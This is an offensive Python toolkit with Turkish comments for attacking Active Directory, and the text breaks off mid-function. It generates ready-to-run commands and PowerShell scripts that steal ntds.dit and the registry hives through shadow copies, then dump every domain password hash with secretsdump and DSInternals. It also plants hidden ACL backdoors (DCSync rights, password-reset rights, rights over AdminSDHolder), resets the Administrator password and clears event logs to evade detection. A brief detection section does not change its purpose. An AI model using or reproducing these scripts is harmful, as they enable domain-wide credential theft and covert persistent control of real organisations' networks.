"""
Living off the Forest - Advanced Active Directory Exploitation
==============================================================
AD'nin kendi özelliklerini ona karşı kullanmak

Modules:
1. Shadow Copy (VSS) Raider - ntds.dit extraction via Volume Shadow Copy
2. ACL Backdoor - Hidden admin via stealthy ACL manipulation

"Ormanın içinde yaşamak - AD'nin kendi silahlarını kullan"

Author: Monolith
Date: February 2026
"""

import os
import re
import json
import base64
import hashlib
import random
import string
import struct
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import uuid


class VSSMethod(Enum):
    """Volume Shadow Copy extraction methods"""
    WMIC = "wmic"                    # Classic wmic shadowcopy
    VSSADMIN = "vssadmin"            # vssadmin create shadow
    DISKSHADOW = "diskshadow"        # diskshadow scripted
    POWERSHELL = "powershell"        # PowerShell WMI
    ESENTUTL = "esentutl"            # esentutl.exe copy


class ACLRight(Enum):
    """Dangerous ACL rights for backdoor"""
    WRITE_PROPERTY = "WriteProperty"
    WRITE_DACL = "WriteDacl"
    WRITE_OWNER = "WriteOwner"
    GENERIC_ALL = "GenericAll"
    GENERIC_WRITE = "GenericWrite"
    SELF_MEMBERSHIP = "Self"         # Add self to group
    FORCE_CHANGE_PASSWORD = "User-Force-Change-Password"
    DS_REPLICATION_GET_CHANGES = "DS-Replication-Get-Changes"
    DS_REPLICATION_GET_CHANGES_ALL = "DS-Replication-Get-Changes-All"


class TargetObject(Enum):
    """Target AD objects for ACL backdoor"""
    DOMAIN_ADMINS = "Domain Admins"
    ENTERPRISE_ADMINS = "Enterprise Admins"
    ADMINISTRATORS = "Administrators"
    ACCOUNT_OPERATORS = "Account Operators"
    SCHEMA_ADMINS = "Schema Admins"
    DOMAIN_ROOT = "Domain Root"
    DC_OU = "Domain Controllers OU"
    KRBTGT = "krbtgt"
    ADMIN_SD_HOLDER = "AdminSDHolder"


@dataclass
class ShadowCopyResult:
    """Result of shadow copy operation"""
    success: bool
    shadow_id: str
    shadow_path: str
    ntds_path: str
    system_path: str
    extraction_method: VSSMethod
    timestamp: datetime
    cleanup_done: bool
    extracted_files: List[str]
    error: Optional[str] = None


@dataclass
class ACLBackdoor:
    """ACL backdoor configuration"""
    backdoor_id: str
    target_user: str
    target_user_sid: str
    target_object: str
    target_object_dn: str
    granted_right: ACLRight
    created_at: datetime
    is_active: bool
    detection_risk: str  # low, medium, high
    persistence_notes: str


@dataclass
class ExtractedCredentials:
    """Credentials extracted from ntds.dit"""
    username: str
    domain: str
    nt_hash: str
    lm_hash: Optional[str]
    sid: str
    is_enabled: bool
    is_admin: bool
    last_logon: Optional[datetime]
    password_last_set: Optional[datetime]


class ShadowCopyRaider:
    """
    Shadow Copy (VSS) Raider
    
    ntds.dit dosyası kilitlidir, doğrudan kopyalayamazsın.
    Volume Shadow Copy kullanarak sessizce çalınır.
    
    Avantajlar:
    - Mimikatz'dan çok daha sessiz
    - Doğrudan tüm hash'lere erişim
    - Offline analiz imkanı
    """
    
    # File paths
    NTDS_PATH = r"C:\Windows\NTDS\ntds.dit"
    SYSTEM_HIVE = r"C:\Windows\System32\config\SYSTEM"
    SECURITY_HIVE = r"C:\Windows\System32\config\SECURITY"
    
    def __init__(self):
        self.shadow_copies: Dict[str, ShadowCopyResult] = {}
        self.extracted_creds: List[ExtractedCredentials] = []
    
    def generate_vss_commands(self, 
                              method: VSSMethod,
                              output_path: str = r"C:\Windows\Temp",
                              cleanup: bool = True) -> Dict[str, Any]:
        """Generate VSS extraction commands for different methods"""
        
        shadow_id = ''.join(random.choices(string.ascii_lowercase, k=8))
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        result = {
            "method": method.value,
            "shadow_id": shadow_id,
            "commands": [],
            "powershell_script": "",
            "cleanup_commands": [],
            "output_files": {
                "ntds": f"{output_path}\\ntds_{timestamp}.dit",
                "system": f"{output_path}\\SYSTEM_{timestamp}",
                "security": f"{output_path}\\SECURITY_{timestamp}"
            },
            "detection_notes": "",
            "opsec_rating": ""
        }
        
        if method == VSSMethod.WMIC:
            result["commands"] = self._generate_wmic_commands(output_path, timestamp)
            result["detection_notes"] = "WMIC shadow copy creation logged in Event ID 8222, 8224"
            result["opsec_rating"] = "medium"
            
        elif method == VSSMethod.VSSADMIN:
            result["commands"] = self._generate_vssadmin_commands(output_path, timestamp)
            result["detection_notes"] = "vssadmin.exe execution may trigger EDR"
            result["opsec_rating"] = "low"
            
        elif method == VSSMethod.DISKSHADOW:
            result["commands"], result["diskshadow_script"] = self._generate_diskshadow_commands(output_path, timestamp)
            result["detection_notes"] = "diskshadow.exe is less monitored than vssadmin"
            result["opsec_rating"] = "medium-high"
            
        elif method == VSSMethod.POWERSHELL:
            result["powershell_script"] = self._generate_powershell_vss(output_path, timestamp)
            result["commands"] = [f"powershell -ep bypass -f vss_extract_{timestamp}.ps1"]
            result["detection_notes"] = "PowerShell logging may capture script"
            result["opsec_rating"] = "medium"
            
        elif method == VSSMethod.ESENTUTL:
            result["commands"] = self._generate_esentutl_commands(output_path, timestamp)
            result["detection_notes"] = "esentutl.exe is a legitimate Windows tool"
            result["opsec_rating"] = "high"
        
        if cleanup:
            result["cleanup_commands"] = self._generate_cleanup_commands(method)
        
        return result
    
    def _generate_wmic_commands(self, output_path: str, timestamp: str) -> List[str]:
        """Generate WMIC-based VSS commands"""
        return [
            "# Step 1: Create shadow copy",
            'wmic shadowcopy call create Volume="C:\\"',
            "",
            "# Step 2: Get shadow copy device name",
            'wmic shadowcopy list brief',
            "",
            "# Step 3: Copy ntds.dit from shadow (replace YOURDEVICE)",
            f'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit {output_path}\\ntds_{timestamp}.dit',
            "",
            "# Step 4: Copy SYSTEM hive",
            f'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM {output_path}\\SYSTEM_{timestamp}',
            "",
            "# Step 5: Copy SECURITY hive (optional, for cached creds)",
            f'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY {output_path}\\SECURITY_{timestamp}',
        ]
    
    def _generate_vssadmin_commands(self, output_path: str, timestamp: str) -> List[str]:
        """Generate vssadmin-based VSS commands"""
        return [
            "# Step 1: Create shadow copy",
            'vssadmin create shadow /for=C:',
            "",
            "# Step 2: List shadows to get ID",
            'vssadmin list shadows',
            "",
            "# Step 3: Copy files (replace shadow path)",
            f'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit {output_path}\\ntds_{timestamp}.dit',
            f'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM {output_path}\\SYSTEM_{timestamp}',
            "",
            "# Alternative: Use robocopy for locked files",
            f'robocopy /B \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS {output_path} ntds.dit',
        ]
    
    def _generate_diskshadow_commands(self, output_path: str, timestamp: str) -> Tuple[List[str], str]:
        """Generate diskshadow-based VSS commands"""
        
        # Diskshadow script content
        script = f"""# Diskshadow script for ntds.dit extraction
# Save as extract.dsh and run: diskshadow /s extract.dsh

set context persistent nowriters
set metadata {output_path}\\metadata.cab
set verbose on
begin backup
add volume c: alias systemdrive
create
expose %systemdrive% x:
end backup

# Manual copy after expose:
# copy x:\\windows\\ntds\\ntds.dit {output_path}\\ntds_{timestamp}.dit
# copy x:\\windows\\system32\\config\\SYSTEM {output_path}\\SYSTEM_{timestamp}

# Cleanup
# delete shadows volume c:
# unexpose x:
"""
        
        commands = [
            "# Step 1: Create diskshadow script",
            f'echo set context persistent nowriters > {output_path}\\extract.dsh',
            f'echo add volume c: alias cdrive >> {output_path}\\extract.dsh',
            f'echo create >> {output_path}\\extract.dsh',
            f'echo expose %%cdrive%% x: >> {output_path}\\extract.dsh',
            "",
            "# Step 2: Execute diskshadow",
            f'diskshadow /s {output_path}\\extract.dsh',
            "",
            "# Step 3: Copy from exposed drive",
            f'copy x:\\windows\\ntds\\ntds.dit {output_path}\\ntds_{timestamp}.dit',
            f'copy x:\\windows\\system32\\config\\SYSTEM {output_path}\\SYSTEM_{timestamp}',
            "",
            "# Step 4: Cleanup",
            'diskshadow',
            '> unexpose x:',
            '> delete shadows all',
            '> exit',
        ]
        
        return commands, script
    
    def _generate_powershell_vss(self, output_path: str, timestamp: str) -> str:
        """Generate PowerShell VSS extraction script"""
        
        return f'''# PowerShell VSS Extraction Script
# Run as Administrator on Domain Controller

param(
    [string]$OutputPath = "{output_path}",
    [switch]$Cleanup = $true
)

$ErrorActionPreference = "Stop"

function Write-Status($msg) {{
    Write-Host "[*] $msg" -ForegroundColor Cyan
}}

function Write-Success($msg) {{
    Write-Host "[+] $msg" -ForegroundColor Green
}}

function Write-Error($msg) {{
    Write-Host "[-] $msg" -ForegroundColor Red
}}

try {{
    Write-Status "Creating Volume Shadow Copy..."
    
    # Create shadow copy using WMI
    $shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\", "ClientAccessible")
    $shadowID = $shadow.ShadowID
    
    # Get the shadow copy path
    $shadowCopy = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowID }}
    $shadowPath = $shadowCopy.DeviceObject
    
    Write-Success "Shadow copy created: $shadowPath"
    
    # Create symlink for easier access
    $linkPath = "C:\\shadowcopy"
    cmd /c mklink /d $linkPath "$shadowPath\\"
    
    Write-Status "Copying ntds.dit..."
    Copy-Item "$linkPath\\Windows\\NTDS\\ntds.dit" "$OutputPath\\ntds_{timestamp}.dit" -Force
    Write-Success "ntds.dit copied"
    
    Write-Status "Copying SYSTEM hive..."
    Copy-Item "$linkPath\\Windows\\System32\\config\\SYSTEM" "$OutputPath\\SYSTEM_{timestamp}" -Force
    Write-Success "SYSTEM hive copied"
    
    Write-Status "Copying SECURITY hive..."
    Copy-Item "$linkPath\\Windows\\System32\\config\\SECURITY" "$OutputPath\\SECURITY_{timestamp}" -Force
    Write-Success "SECURITY hive copied"
    
    if ($Cleanup) {{
        Write-Status "Cleaning up..."
        
        # Remove symlink
        cmd /c rmdir $linkPath
        
        # Delete shadow copy
        $shadowCopy.Delete()
        
        Write-Success "Cleanup complete"
    }}
    
    Write-Success "Extraction complete!"
    Write-Host ""
    Write-Host "Files extracted to:" -ForegroundColor Yellow
    Write-Host "  - $OutputPath\\ntds_{timestamp}.dit"
    Write-Host "  - $OutputPath\\SYSTEM_{timestamp}"
    Write-Host "  - $OutputPath\\SECURITY_{timestamp}"
    Write-Host ""
    Write-Host "Next step: Use secretsdump.py or DSInternals to extract hashes" -ForegroundColor Yellow
    
}} catch {{
    Write-Error "Error: $_"
    
    # Cleanup on error
    if (Test-Path "C:\\shadowcopy") {{
        cmd /c rmdir "C:\\shadowcopy"
    }}
}}
'''

    def _generate_esentutl_commands(self, output_path: str, timestamp: str) -> List[str]:
        """Generate esentutl-based extraction (no VSS needed for some scenarios)"""
        return [
            "# Method 1: Direct copy with esentutl (if file not locked)",
            f'esentutl.exe /y /vss "C:\\Windows\\NTDS\\ntds.dit" /d "{output_path}\\ntds_{timestamp}.dit"',
            "",
            "# Method 2: Using ntdsutil (built-in, very stealthy)",
            'ntdsutil',
            '> activate instance ntds',
            '> ifm',
            f'> create full {output_path}\\ifm_dump',
            '> quit',
            '> quit',
            "",
            "# The IFM dump contains:",
            f"#   {output_path}\\ifm_dump\\Active Directory\\ntds.dit",
            f"#   {output_path}\\ifm_dump\\registry\\SYSTEM",
            f"#   {output_path}\\ifm_dump\\registry\\SECURITY",
        ]
    
    def _generate_cleanup_commands(self, method: VSSMethod) -> List[str]:
        """Generate cleanup commands"""
        return [
            "# Cleanup commands (run after extraction)",
            "",
            "# Delete all shadow copies",
            'vssadmin delete shadows /all /quiet',
            "",
            "# Or using WMIC",
            'wmic shadowcopy delete',
            "",
            "# Clear VSS event logs (optional, increases detection risk)",
            'wevtutil cl Microsoft-Windows-VHDMP-Operational',
            "",
            "# Remove extracted files after exfiltration",
            '# del /f /q C:\\Windows\\Temp\\ntds_*.dit',
            '# del /f /q C:\\Windows\\Temp\\SYSTEM_*',
        ]
    
    def generate_secretsdump_command(self, 
                                      ntds_path: str, 
                                      system_path: str,
                                      output_file: str = "hashes.txt") -> str:
        """Generate impacket secretsdump command for offline extraction"""
        
        return f'''# Offline hash extraction using impacket-secretsdump

# Basic extraction
impacket-secretsdump -ntds {ntds_path} -system {system_path} LOCAL -outputfile {output_file}

# With history (previous passwords)
impacket-secretsdump -ntds {ntds_path} -system {system_path} -history LOCAL -outputfile {output_file}

# Just NTLM hashes
impacket-secretsdump -ntds {ntds_path} -system {system_path} -just-dc-ntlm LOCAL

# Output format:
# username:RID:LMhash:NThash:::

# Using DSInternals (PowerShell)
# Install-Module DSInternals -Force
# $key = Get-BootKey -SystemHivePath {system_path}
# Get-ADDBAccount -All -DBPath {ntds_path} -BootKey $key | Format-Custom -View HashcatNT
'''

    def generate_dsinternals_script(self, 
                                     ntds_path: str, 
                                     system_path: str) -> str:
        """Generate DSInternals PowerShell script for hash extraction"""
        
        return f'''# DSInternals - Offline ntds.dit Hash Extraction
# Requires: Install-Module DSInternals -Force

param(
    [string]$NtdsPath = "{ntds_path}",
    [string]$SystemPath = "{system_path}",
    [string]$OutputPath = "extracted_hashes"
)

Import-Module DSInternals

Write-Host "[*] Extracting boot key from SYSTEM hive..." -ForegroundColor Cyan
$bootKey = Get-BootKey -SystemHivePath $SystemPath

Write-Host "[+] Boot key: $($bootKey | ForEach-Object {{ $_.ToString("X2") }} | Join-String)" -ForegroundColor Green

Write-Host "[*] Opening ntds.dit database..." -ForegroundColor Cyan
$accounts = Get-ADDBAccount -All -DBPath $NtdsPath -BootKey $bootKey

Write-Host "[+] Found $($accounts.Count) accounts" -ForegroundColor Green

# Export in various formats
Write-Host "[*] Exporting hashes..." -ForegroundColor Cyan

# Hashcat format (NT)
$accounts | Format-Custom -View HashcatNT | Out-File "$OutputPath\\hashcat_nt.txt"

# Hashcat format (LM)
$accounts | Where-Object {{ $_.LMHash }} | Format-Custom -View HashcatLM | Out-File "$OutputPath\\hashcat_lm.txt"

# Full account info
$accounts | Select-Object SamAccountName, Enabled, 
    @{{N='NTHash';E={{$_.NTHash | ForEach-Object {{ $_.ToString("X2") }} | Join-String}}}},
    @{{N='LMHash';E={{$_.LMHash | ForEach-Object {{ $_.ToString("X2") }} | Join-String}}}},
    SID, DistinguishedName | 
    Export-Csv "$OutputPath\\accounts.csv" -NoTypeInformation

# Domain Admins only
$domainAdmins = $accounts | Where-Object {{ 
    $_.MemberOf -match "Domain Admins|Enterprise Admins|Administrators"
}}
$domainAdmins | Format-Custom -View HashcatNT | Out-File "$OutputPath\\domain_admins.txt"

Write-Host ""
Write-Host "[+] Export complete!" -ForegroundColor Green
Write-Host "    - $OutputPath\\hashcat_nt.txt (Hashcat NT format)"
Write-Host "    - $OutputPath\\hashcat_lm.txt (Hashcat LM format)"  
Write-Host "    - $OutputPath\\accounts.csv (Full account info)"
Write-Host "    - $OutputPath\\domain_admins.txt (Admin hashes only)"
Write-Host ""

# Statistics
$enabled = ($accounts | Where-Object {{ $_.Enabled }}).Count
$admins = $domainAdmins.Count
$withLM = ($accounts | Where-Object {{ $_.LMHash }}).Count

Write-Host "[*] Statistics:" -ForegroundColor Yellow
Write-Host "    Total accounts: $($accounts.Count)"
Write-Host "    Enabled accounts: $enabled"
Write-Host "    Admin accounts: $admins"
Write-Host "    Accounts with LM hash: $withLM (weak!)"
'''


class ACLBackdoorManager:
    """
    ACL (Access Control List) Backdoor Manager
    
    Domain Admin yaratmak çok ses çıkarır.
    Bunun yerine normal bir kullanıcıya gizli yetkiler verilir.
    
    Örnek: stajyer_ahmet'e Domain Admins üzerinde
    "ResetPassword" yetkisi verilir - kimse fark etmez
    ama o hesap aslında gizli admin'dir.
    """
    
    # Well-known SIDs
    WELL_KNOWN_SIDS = {
        "Domain Admins": "S-1-5-21-<DOMAIN>-512",
        "Enterprise Admins": "S-1-5-21-<ROOT_DOMAIN>-519",
        "Administrators": "S-1-5-32-544",
        "Account Operators": "S-1-5-32-548",
        "Schema Admins": "S-1-5-21-<ROOT_DOMAIN>-518",
    }
    
    # Dangerous ACL GUIDs
    ACL_GUIDS = {
        "User-Force-Change-Password": "00299570-246d-11d0-a768-00aa006e0529",
        "DS-Replication-Get-Changes": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
        "DS-Replication-Get-Changes-All": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
        "Member": "bf9679c0-0de6-11d0-a285-00aa003049e2",  # Add to group
        "WriteProperty-All": "00000000-0000-0000-0000-000000000000",
    }
    
    def __init__(self):
        self.backdoors: Dict[str, ACLBackdoor] = {}
    
    def generate_acl_backdoor(self,
                               target_user: str,
                               target_object: TargetObject,
                               acl_right: ACLRight,
                               domain: str = "YOURDOMAIN") -> Dict[str, Any]:
        """Generate ACL backdoor commands and scripts"""
        
        backdoor_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        result = {
            "backdoor_id": backdoor_id,
            "target_user": target_user,
            "target_object": target_object.value,
            "acl_right": acl_right.value,
            "domain": domain,
            "powershell_commands": [],
            "powershell_script": "",
            "detection_commands": [],
            "exploitation_commands": [],
            "cleanup_commands": [],
            "detection_risk": self._calculate_detection_risk(acl_right, target_object),
            "persistence_notes": "",
            "attack_path": []
        }
        
        # Generate PowerShell commands
        result["powershell_commands"] = self._generate_powershell_acl_commands(
            target_user, target_object, acl_right, domain
        )
        
        # Generate full script
        result["powershell_script"] = self._generate_full_acl_script(
            target_user, target_object, acl_right, domain
        )
        
        # How to detect this backdoor
        result["detection_commands"] = self._generate_detection_commands(
            target_user, target_object, domain
        )
        
        # How to exploit the backdoor
        result["exploitation_commands"] = self._generate_exploitation_commands(
            target_user, target_object, acl_right, domain
        )
        
        # Cleanup commands
        result["cleanup_commands"] = self._generate_cleanup_acl_commands(
            target_user, target_object, acl_right, domain
        )
        
        # Attack path explanation
        result["attack_path"] = self._generate_attack_path(
            target_user, target_object, acl_right
        )
        
        result["persistence_notes"] = self._generate_persistence_notes(target_object)
        
        return result
    
    def _generate_powershell_acl_commands(self,
                                           target_user: str,
                                           target_object: TargetObject,
                                           acl_right: ACLRight,
                                           domain: str) -> List[str]:
        """Generate PowerShell commands for ACL backdoor"""
        
        commands = []
        
        # Import module
        commands.append("# Import Active Directory module")
        commands.append("Import-Module ActiveDirectory")
        commands.append("")
        
        # Get target DN based on object type
        if target_object == TargetObject.DOMAIN_ADMINS:
            target_dn = f'"CN=Domain Admins,CN=Users,DC={domain.split(".")[0]},DC={domain.split(".")[-1]}"'
            commands.append(f"# Target: Domain Admins group")
            commands.append(f"$TargetDN = {target_dn}")
            
        elif target_object == TargetObject.DOMAIN_ROOT:
            target_dn = f'"DC={domain.split(".")[0]},DC={domain.split(".")[-1]}"'
            commands.append(f"# Target: Domain Root (for DCSync)")
            commands.append(f"$TargetDN = {target_dn}")
            
        elif target_object == TargetObject.ADMIN_SD_HOLDER:
            target_dn = f'"CN=AdminSDHolder,CN=System,DC={domain.split(".")[0]},DC={domain.split(".")[-1]}"'
            commands.append(f"# Target: AdminSDHolder (affects all protected accounts)")
            commands.append(f"$TargetDN = {target_dn}")
            
        elif target_object == TargetObject.KRBTGT:
            target_dn = f'"CN=krbtgt,CN=Users,DC={domain.split(".")[0]},DC={domain.split(".")[-1]}"'
            commands.append(f"# Target: krbtgt account")
            commands.append(f"$TargetDN = {target_dn}")
        
        else:
            target_dn = f'"CN={target_object.value},CN=Builtin,DC={domain.split(".")[0]},DC={domain.split(".")[-1]}"'
            commands.append(f"# Target: {target_object.value}")
            commands.append(f"$TargetDN = {target_dn}")
        
        commands.append("")
        
        # Get user SID
        commands.append(f"# Get backdoor user SID")
        commands.append(f'$User = Get-ADUser -Identity "{target_user}"')
        commands.append(f"$UserSID = $User.SID")
        commands.append("")
        
        # Build ACL based on right type
        if acl_right == ACLRight.GENERIC_ALL:
            commands.extend([
                "# Grant GenericAll (full control)",
                "$ACL = Get-Acl -Path \"AD:\\$TargetDN\"",
                "$Identity = [System.Security.Principal.IdentityReference]$UserSID",
                "$ADRight = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll",
                "$Type = [System.Security.AccessControl.AccessControlType]::Allow",
                "$Inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All",
                "",
                "$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(",
                "    $Identity, $ADRight, $Type, $Inheritance",
                ")",
                "",
                "$ACL.AddAccessRule($ACE)",
                "Set-Acl -Path \"AD:\\$TargetDN\" -AclObject $ACL",
            ])
            
        elif acl_right == ACLRight.WRITE_DACL:
            commands.extend([
                "# Grant WriteDacl (modify permissions)",
                "$ACL = Get-Acl -Path \"AD:\\$TargetDN\"",
                "$Identity = [System.Security.Principal.IdentityReference]$UserSID",
                "$ADRight = [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl",
                "$Type = [System.Security.AccessControl.AccessControlType]::Allow",
                "$Inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None",
                "",
                "$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(",
                "    $Identity, $ADRight, $Type, $Inheritance",
                ")",
                "",
                "$ACL.AddAccessRule($ACE)",
                "Set-Acl -Path \"AD:\\$TargetDN\" -AclObject $ACL",
            ])
            
        elif acl_right == ACLRight.FORCE_CHANGE_PASSWORD:
            commands.extend([
                "# Grant Force Change Password (reset any user's password)",
                "$GUID = [GUID]'00299570-246d-11d0-a768-00aa006e0529'  # User-Force-Change-Password",
                "$ACL = Get-Acl -Path \"AD:\\$TargetDN\"",
                "$Identity = [System.Security.Principal.IdentityReference]$UserSID",
                "$ADRight = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight",
                "$Type = [System.Security.AccessControl.AccessControlType]::Allow",
                "$Inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All",
                "",
                "$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(",
                "    $Identity, $ADRight, $Type, $GUID, $Inheritance",
                ")",
                "",
                "$ACL.AddAccessRule($ACE)",
                "Set-Acl -Path \"AD:\\$TargetDN\" -AclObject $ACL",
            ])
            
        elif acl_right in [ACLRight.DS_REPLICATION_GET_CHANGES, ACLRight.DS_REPLICATION_GET_CHANGES_ALL]:
            # DCSync rights
            commands.extend([
                "# Grant DCSync rights (extract all hashes remotely)",
                "# Requires BOTH rights on domain root",
                "",
                "$GUID1 = [GUID]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes",
                "$GUID2 = [GUID]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All",
                "",
                "$ACL = Get-Acl -Path \"AD:\\$TargetDN\"",
                "$Identity = [System.Security.Principal.IdentityReference]$UserSID",
                "$ADRight = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight",
                "$Type = [System.Security.AccessControl.AccessControlType]::Allow",
                "$Inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None",
                "",
                "# First right",
                "$ACE1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(",
                "    $Identity, $ADRight, $Type, $GUID1, $Inheritance",
                ")",
                "$ACL.AddAccessRule($ACE1)",
                "",
                "# Second right",
                "$ACE2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(",
                "    $Identity, $ADRight, $Type, $GUID2, $Inheritance",
                ")",
                "$ACL.AddAccessRule($ACE2)",
                "",
                "Set-Acl -Path \"AD:\\$TargetDN\" -AclObject $ACL",
            ])
            
        elif acl_right == ACLRight.SELF_MEMBERSHIP:
            commands.extend([
                "# Grant Self (add self to group)",
                "$GUID = [GUID]'bf9679c0-0de6-11d0-a285-00aa003049e2'  # Member attribute",
                "$ACL = Get-Acl -Path \"AD:\\$TargetDN\"",
                "$Identity = [System.Security.Principal.IdentityReference]$UserSID",
                "$ADRight = [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty",
                "$Type = [System.Security.AccessControl.AccessControlType]::Allow",
                "$Inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None",
                "",
                "$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(",
                "    $Identity, $ADRight, $Type, $GUID, $Inheritance",
                ")",
                "",
                "$ACL.AddAccessRule($ACE)",
                "Set-Acl -Path \"AD:\\$TargetDN\" -AclObject $ACL",
            ])
        
        commands.append("")
        commands.append('Write-Host "[+] ACL backdoor installed successfully" -ForegroundColor Green')
        
        return commands
    
    def _generate_full_acl_script(self,
                                   target_user: str,
                                   target_object: TargetObject,
                                   acl_right: ACLRight,
                                   domain: str) -> str:
        """Generate full PowerShell script for ACL backdoor"""
        
        commands = self._generate_powershell_acl_commands(
            target_user, target_object, acl_right, domain
        )
        
        script = f'''# ACL Backdoor Installation Script
# Target User: {target_user}
# Target Object: {target_object.value}
# Right Granted: {acl_right.value}
# Domain: {domain}
#
# WARNING: Run as Domain Admin

param(
    [Parameter(Mandatory=$false)]
    [string]$TargetUser = "{target_user}",
    
    [Parameter(Mandatory=$false)]
    [switch]$Verify = $false
)

$ErrorActionPreference = "Stop"

function Write-Status($msg) {{
    Write-Host "[*] $msg" -ForegroundColor Cyan
}}

function Write-Success($msg) {{
    Write-Host "[+] $msg" -ForegroundColor Green
}}

function Write-Warning($msg) {{
    Write-Host "[!] $msg" -ForegroundColor Yellow
}}

try {{
    Write-Status "Starting ACL backdoor installation..."
    Write-Warning "Target: {target_object.value}"
    Write-Warning "Right: {acl_right.value}"
    Write-Host ""
    
    {chr(10).join(commands)}
    
    if ($Verify) {{
        Write-Host ""
        Write-Status "Verifying ACL installation..."
        $NewACL = Get-Acl -Path "AD:\\$TargetDN"
        $NewACL.Access | Where-Object {{ $_.IdentityReference -match $TargetUser }} | 
            Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType -AutoSize
    }}
    
}} catch {{
    Write-Host "[-] Error: $_" -ForegroundColor Red
}}
'''
        return script
    
    def _generate_detection_commands(self,
                                      target_user: str,
                                      target_object: TargetObject,
                                      domain: str) -> List[str]:
        """Generate commands to detect this backdoor"""
        
        return [
            "# How to detect this ACL backdoor",
            "",
            "# 1. Check ACLs on sensitive objects",
            f'Get-Acl -Path "AD:\\CN={target_object.value},..." | Select-Object -ExpandProperty Access | ',
            f'    Where-Object {{ $_.IdentityReference -notmatch "SYSTEM|Domain Admins|Enterprise Admins" }}',
            "",
            "# 2. Use BloodHound to find attack paths",
            "# SharpHound.exe -c ACL,ObjectProps",
            "",
            "# 3. Check for unusual extended rights",
            "Get-ADObject -Filter * -Properties nTSecurityDescriptor | ForEach-Object {",
            "    $_.nTSecurityDescriptor.Access | Where-Object { ",
            "        $_.ActiveDirectoryRights -match 'ExtendedRight|GenericAll|WriteDacl|WriteOwner'",
            "    }",
            "}",
            "",
            "# 4. Monitor Security Event ID 5136 (Directory Service Changes)",
            "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136} | ",
            "    Where-Object { $_.Message -match 'nTSecurityDescriptor' }",
        ]
    
    def _generate_exploitation_commands(self,
                                         target_user: str,
                                         target_object: TargetObject,
                                         acl_right: ACLRight,
                                         domain: str) -> List[str]:
        """Generate commands to exploit the backdoor"""
        
        commands = [
            f"# Exploiting the ACL backdoor as {target_user}",
            f"# Authenticate as: {target_user}@{domain}",
            "",
        ]
        
        if acl_right == ACLRight.SELF_MEMBERSHIP:
            commands.extend([
                "# Add yourself to Domain Admins",
                f'Add-ADGroupMember -Identity "Domain Admins" -Members "{target_user}"',
                "",
                "# Or using net command",
                f'net group "Domain Admins" {target_user} /add /domain',
            ])
            
        elif acl_right == ACLRight.FORCE_CHANGE_PASSWORD:
            commands.extend([
                "# Reset any user's password",
                'Set-ADAccountPassword -Identity "Administrator" -Reset -NewPassword (ConvertTo-SecureString "NewP@ssw0rd123" -AsPlainText -Force)',
                "",
                "# Or using net command",
                'net user Administrator NewP@ssw0rd123 /domain',
            ])
            
        elif acl_right in [ACLRight.DS_REPLICATION_GET_CHANGES, ACLRight.DS_REPLICATION_GET_CHANGES_ALL]:
            commands.extend([
                "# Perform DCSync attack",
                f'impacket-secretsdump -just-dc {domain}/{target_user}:Password123@dc.{domain}',
                "",
                "# Using Mimikatz",
                f'mimikatz # lsadump::dcsync /domain:{domain} /user:Administrator',
            ])
            
        elif acl_right == ACLRight.GENERIC_ALL:
            commands.extend([
                "# Full control - multiple options:",
                "",
                "# Option 1: Add to group",
                f'Add-ADGroupMember -Identity "{target_object.value}" -Members "{target_user}"',
                "",
                "# Option 2: Reset password (if user object)",
                f'Set-ADAccountPassword -Identity "target" -Reset -NewPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force)',
                "",
                "# Option 3: Modify object attributes",
                f'Set-ADObject -Identity "target" -Add @{{servicePrincipalName="http/evil"}}  # For Kerberoasting',
            ])
            
        elif acl_right == ACLRight.WRITE_DACL:
            commands.extend([
                "# Modify permissions to grant yourself more rights",
                "# First, grant yourself GenericAll",
                f'$ACL = Get-Acl -Path "AD:\\target"',
                f'$User = Get-ADUser "{target_user}"',
                f'$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(',
                f'    $User.SID, "GenericAll", "Allow"',
                f')',
                f'$ACL.AddAccessRule($ACE)',
                f'Set-Acl -Path "AD:\\target" -AclObject $ACL',
                "",
                "# Now you have full control",
            ])
        
        return commands
    
    def _generate_cleanup_acl_commands(self,
                                        target_user: str,
                                        target_object: TargetObject,
